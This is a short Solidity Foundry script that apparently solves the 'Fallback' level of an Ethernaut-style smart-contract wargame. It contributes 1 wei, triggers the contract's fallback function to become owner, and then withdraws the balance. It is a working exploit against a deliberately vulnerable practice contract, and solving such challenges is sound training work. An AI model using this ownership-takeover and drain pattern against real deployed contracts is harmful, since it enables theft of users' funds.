// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/01_fallback.sol";

contract AttackerFallbackScript is Script {
    Fallback fallbck = Fallback(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        fallbck.contribute{value: 1 wei}();
        fallbck.getContribution();

        (bool success, ) = address(fallbck).call{value: 1 wei}("");
        require(success, "Transfer failed!");

        fallbck.owner();
        fallbck.withdraw();

        vm.stopBroadcast();
    }
}
